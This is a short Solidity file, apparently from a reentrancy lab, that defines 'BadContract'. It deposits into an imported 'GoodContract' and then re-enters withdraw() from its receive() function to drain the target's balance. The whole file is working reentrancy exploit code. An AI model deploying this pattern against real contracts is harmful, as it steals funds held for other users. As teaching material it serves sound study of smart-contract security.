// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;
    constructor (address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    //function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    //starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}